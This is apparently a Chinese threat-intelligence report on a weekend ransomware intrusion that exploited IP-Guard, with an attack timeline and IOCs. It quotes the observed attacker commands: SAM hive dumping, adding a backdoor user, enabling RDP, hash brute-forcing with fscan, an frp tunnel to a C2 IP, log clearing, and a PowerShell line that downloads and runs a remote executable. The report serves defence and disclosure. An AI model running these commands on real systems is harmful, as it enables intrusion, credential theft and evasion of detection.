#  揭秘LIVE勒索软件利用IP-Guard漏洞的技战术   
原创 威胁情报中心  奇安信威胁情报中心   2024-01-23 17:45  
  
概述  
  
奇安信威胁情报中心观察到一伙较为勤奋的勒索运营商，工作时间主要在周末，可以在物理上绕过安全人员对告警的发现。周六的时候使用一些Nday漏洞进行入侵，全天无休的进行内网信息收集，控制机器数量评估，并在周日晚上控制木马批量投递勒索软件，为了给第二天要上班的受害者一个“惊喜”，攻击者在横向移动所使用的工具主要有Cobalt Strike、fscan、frp、勒索投递包等，攻击手法与护网期间的国内红队有着很高的相似性。  
  
文章最后我们就自己的数据视野来分析IP-Guard漏洞相关活动的整个时间线，揭露了当前高强度的攻防对抗状态。  
  
  
典型渗透攻击过程回顾  
  
       攻击者使用IP-Guard漏洞上传webshell后开始收集本机信息，使用webshell执行如下命令：  
  
<table><tbody><tr style="mso-yfti-irow:-1;mso-yfti-firstrow:yes;mso-yfti-lastfirstrow:yes;"><td width="580" valign="top" style="border-width: 1pt;border-style: solid;border-color: rgb(147, 197, 113);background: rgb(112, 173, 71);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:5;"><strong><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;color:white;mso-themecolor:background1;">命令</span></strong><strong><span lang="EN-US" style="font-size:7.5pt;line-height:150%;color:white;mso-themecolor:
  background1;"><o:p></o:p></span></strong></p></td></tr><tr style="mso-yfti-irow:0;"><td width="580" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">net user<o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:1;"><td width="580" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:132;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">tasklist<o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:2;"><td width="580" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">dir<o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:3;"><td width="580" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:132;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">save hklm\system system.zip<o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:4;"><td width="580" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">save hklm\SAM<strong><o:p></o:p></strong></span></p></td></tr><tr style="mso-yfti-irow:5;"><td width="560" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:132;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">net1 user audit Aa123456 /add<o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:6;mso-yfti-lastrow:yes;"><td width="580" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">REG ADD
  &#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&#34; /v
  fDenyTSConnections /t REG_DWORD /d 00000000 /f<strong><o:p></o:p></strong></span></p></td></tr></tbody></table>  
攻击者第一步收集本机信息、获取账户密码hash、添加用户并尝试RDP远程登录。接着在%UserProfile%目录下投递名为b.exe的Cobalt Strike木马，启动后将shellcode注入到lsass.exe进程中，C2：38.46.8.218:55324，使用CS在相同目录下投递如下文件，攻击者在投递这些工具时被天擎报毒查杀，由于周末无人观察告警信息导致攻击者很快更换了一批免杀的工具继续“工作”。基本的活动操作如下：  
<table><tbody><tr style="mso-yfti-irow:-1;mso-yfti-firstrow:yes;mso-yfti-lastfirstrow:yes;"><td width="205" valign="top" style="border-top: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-right: none;background: rgb(112, 173, 71);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:5;"><strong><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;color:white;mso-themecolor:background1;">释放的文件</span></strong><strong><span lang="EN-US" style="font-size:7.5pt;line-height:150%;color:white;mso-themecolor:
  background1;"><o:p></o:p></span></strong></p></td><td width="375" valign="top" style="border-top: 1pt solid rgb(147, 197, 113);border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: none;background: rgb(112, 173, 71);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:1;"><strong><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;color:white;mso-themecolor:background1;">功能</span></strong><strong><span lang="EN-US" style="font-size:7.5pt;line-height:150%;color:white;mso-themecolor:
  background1;"><o:p></o:p></span></strong></p></td></tr><tr style="mso-yfti-irow:0;"><td width="205" valign="top" style="border-top: none;border-left: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-right: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">fscan64.exe<o:p></o:p></span></p></td><td width="375" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid rgb(147, 197, 113);border-right: 1pt solid rgb(147, 197, 113);background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:64;"><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;">扫描器</span><span lang="EN-US" style="font-size:7.5pt;line-height:150%;"><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:1;"><td width="205" valign="top" style="border-top: none;border-left: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-right: none;padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:132;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">adduser.exe<o:p></o:p></span></p></td><td width="355" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid rgb(147, 197, 113);border-right: 1pt solid rgb(147, 197, 113);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:128;"><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;">添加用户</span><span lang="EN-US" style="font-size:7.5pt;line-height:150%;"><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:2;mso-yfti-lastrow:yes;"><td width="205" valign="top" style="border-top: none;border-left: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-right: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">f.exe<strong><o:p></o:p></strong></span></p></td><td width="375" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid rgb(147, 197, 113);border-right: 1pt solid rgb(147, 197, 113);background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:64;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">Frp<o:p></o:p></span></p></td></tr></tbody></table>  
       启动fscan开始对同一C段的服务器进行爆破，所用密码为抓取的服务器明文密码和ntml hash，爆破类型涉及RDP、SSH、SMB、MSSQL等。  
  
<table><tbody><tr style="mso-yfti-irow:-1;mso-yfti-firstrow:yes;mso-yfti-lastfirstrow:yes;"><td width="575" valign="top" style="border-width: 1pt;border-style: solid;border-color: rgb(147, 197, 113);background: rgb(112, 173, 71);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:5;"><strong><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;color:white;mso-themecolor:background1;">命令</span></strong><strong><span lang="EN-US" style="font-size:7.5pt;line-height:150%;color:white;mso-themecolor:
  background1;"><o:p></o:p></span></strong></p></td></tr><tr style="mso-yfti-irow:0;"><td width="575" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">fscan64.exe -silent -h 10.XX.X.X/16
  -pa 3389 -o 16.txt -pwda XXXX<o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:1;"><td width="575" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:132;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">fscan64.exe -silent -h 10.XX.X.X/24
  -m ssh -no -pwda XXXX<o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:2;"><td width="555" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">fscan64.exe -h 10.XX.X.X/24 -m mssql
  -pwd XXXXX -o mssql.txt -silent<o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:3;mso-yfti-lastrow:yes;"><td width="575" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:132;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">fscan64 -h 10.XX.X.X/24 -m smb2
  -hash XXXX7119 -username administrator<strong><o:p></o:p></strong></span></p></td></tr></tbody></table>  
启动frp开启反向代理。  
  
<table><tbody><tr style="mso-yfti-irow:-1;mso-yfti-firstrow:yes;mso-yfti-lastfirstrow:yes;"><td width="573" valign="top" style="border-width: 1pt;border-style: solid;border-color: rgb(147, 197, 113);background: rgb(112, 173, 71);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:5;"><strong><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;color:white;mso-themecolor:background1;">命令</span></strong><strong><span lang="EN-US" style="font-size:7.5pt;line-height:150%;color:white;mso-themecolor:
  background1;"><o:p></o:p></span></strong></p></td></tr><tr style="mso-yfti-irow:0;mso-yfti-lastrow:yes;"><td width="553" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">f.exe -t 38.46.8.218 -p 7000<o:p></o:p></span></p></td></tr></tbody></table>  
最后清除系统的ps日志。  
  
<table><tbody><tr style="mso-yfti-irow:-1;mso-yfti-firstrow:yes;mso-yfti-lastfirstrow:yes;"><td width="571" valign="top" style="border-width: 1pt;border-style: solid;border-color: rgb(147, 197, 113);background: rgb(112, 173, 71);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:5;"><strong><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;color:white;mso-themecolor:background1;">命令</span></strong><strong><span lang="EN-US" style="font-size:7.5pt;line-height:150%;color:white;mso-themecolor:
  background1;"><o:p></o:p></span></strong></p></td></tr><tr style="mso-yfti-irow:0;mso-yfti-lastrow:yes;"><td width="551" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">wevtutil cl &#34;Windows
  PowerShell&#34;<o:p></o:p></span></p></td></tr></tbody></table>  
攻击者经过爆破发现已经掌握的明文密码和hash已经可以登录同C段的十几台机器，最终在周日晚上选择使用Cobalt Strike批量下发勒索投递包windows_encryptor_471820908140_self_contained.exe，内容为SFX自解压文件执行后会在%UserProfile%目录下释放名为systime.exe的LIVE家族勒索加密程序。  
  
  
使用的Cobalt Strike的IP反查挂有域名（yangaoqing.com），攻击者在入侵前疑似更换了解析的IP。  
  
<table><tbody><tr style="mso-yfti-irow:-1;mso-yfti-firstrow:yes;mso-yfti-lastfirstrow:yes;"><td width="230" valign="top" style="border-top: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-right: none;background: rgb(112, 173, 71);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:5;"><strong><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;color:white;mso-themecolor:background1;">解析时间</span></strong><strong><span lang="EN-US" style="font-size:7.5pt;line-height:150%;color:white;mso-themecolor:
  background1;"><o:p></o:p></span></strong></p></td><td width="342" valign="top" style="border-top: 1pt solid rgb(147, 197, 113);border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: none;background: rgb(112, 173, 71);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:1;"><strong><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;color:white;mso-themecolor:background1;">对应</span></strong><strong><span lang="EN-US" style="font-size:7.5pt;line-height:150%;color:white;mso-themecolor:
  background1;">IP<o:p></o:p></span></strong></p></td></tr><tr style="mso-yfti-irow:0;"><td width="210" valign="top" style="border-top: none;border-left: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-right: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">2023-01-17~2023-10-09<o:p></o:p></span></p></td><td width="322" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid rgb(147, 197, 113);border-right: 1pt solid rgb(147, 197, 113);background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:64;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">39.97.108.148</span><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:
  &#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;">（北京阿里云）</span><span lang="EN-US" style="font-size:7.5pt;line-height:150%;"><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:1;mso-yfti-lastrow:yes;"><td width="230" valign="top" style="border-top: none;border-left: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-right: none;padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:132;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">2023-10-09~2024-01-18<o:p></o:p></span></p></td><td width="342" valign="top" style="border-top: none;border-left: none;border-bottom: 1pt solid rgb(147, 197, 113);border-right: 1pt solid rgb(147, 197, 113);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:128;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">38.46.8.218</span><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:
  &#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;">（美国）</span><span lang="EN-US" style="font-size:7.5pt;line-height:150%;"><o:p></o:p></span></p></td></tr></tbody></table>  
    
  
I  
P-Gua  
rd  
漏洞的隐密时间线  
  
       在奇安信威胁情报的数据视野中最早于  
2023年9月份就已经看到了IP-Guard的漏洞大规模的测试，多个重要政企受到了入侵，攻击者只执行了whoami命令，当时的研判结论是安全研究员发现了一个0day并进行测试，  
接着在11月08号友商通过漏洞奖励计划发布该漏洞通报后（未提供POC），  
11月9日我们就观察到有黑产在使用IP-Guard漏洞进行批量Web攻击，对应命令行如下：  
  
<table><tbody><tr style="mso-yfti-irow:-1;mso-yfti-firstrow:yes;mso-yfti-lastfirstrow:yes;"><td width="576" valign="top" style="border-width: 1pt;border-style: solid;border-color: rgb(147, 197, 113);background: rgb(112, 173, 71);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:5;"><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;">命令</span><span lang="EN-US" style="font-size:7.5pt;line-height:150%;"><o:p></o:p></span></p></td></tr><tr style="mso-yfti-irow:0;mso-yfti-lastrow:yes;"><td width="556" valign="top" style="border-right: 1pt solid rgb(147, 197, 113);border-bottom: 1pt solid rgb(147, 197, 113);border-left: 1pt solid rgb(147, 197, 113);border-top: none;background: rgb(219, 235, 208);padding: 0cm 5.4pt;"><p style="mso-yfti-cnfc:68;"><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">powershell -executionpolicybypass
  -noprofile -windowstylehidden (new-object
  system.net.webclient).downloadfile(&#39;http</span><span style="font-size:7.5pt;line-height:150%;font-family:宋体;mso-ascii-font-family:&#34;Times New Roman&#34;;mso-hansi-font-family:&#34;Times New Roman&#34;;">：</span><span lang="EN-US" style="font-size:7.5pt;line-height:150%;">//154.12.57.238:7845/svdcx.exe&#39;,&#39;svdcx.exe&#39;);start-process
  svdcx.exe&#34;<o:p></o:p></span></p></td></tr></tbody></table>  
       这波攻击者投递的是ghost、灰鸽子等类型的国产木马，并不适合横向移动，所以这波攻击并没有造成直接的破坏性危害，攻击持续到11月末，接着友商电信安全发布Mallox勒索报告[1]，文中提到勒索团伙利用IP-Guard漏洞的时间在  
12月1号。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic9CibRGUcwzslVQU9mzAw2icNp8aDM8ohIzY6Fz8XLIjz2yIicfN22KmmbYHCsiaNhr5RufMtibYiadR8lQ/640?wx_fmt=png&from=appmsg "")  
  
  
上述现象并不是个例，威胁情报中心观察到有多个Web漏洞在安全通告发布后马上就能检测到相应的在野攻击，间隔这么短无非只有两种可能：1、黑产自己通过分析补丁很快找到漏洞所在并加以利用；2、安全研究员通过赏金计划上报当时未公开所知的漏洞，然后立即又卖给了黑产，这种可能性也无法排除。  
  
  
总结  
  
目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2AqAgxkehic8wSyAKWRic8QXYlYZiaAhZs5GLicWD91BBGBQricn9A6TBEYw4nqZU8Ca5PRL50cibDkuA85n1zicFVt1A/640?wx_fmt=png&from=appmsg "")  
  
  
IOC  
  
38.46.8.218:7000  
  
38.46.8.218:55324  
  
yangaoqing.com  
  
  
参考链接  
  
[1].https://mp.weixin.qq.com/s/0b08HNOWW61DKGA0xwLxSw  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/2AqAgxkehic9CibRGUcwzslVQU9mzAw2icNfJ21iaZdibFYcR1F8yhhkEUOYuQzoxHy1VuQQic29dbiamFPTJDA8rRmAA/640?wx_fmt=gif&from=appmsg "")  
  
点击  
阅读原文至**ALPHA 6.0**  
  
即刻助力威胁研判  
  
  
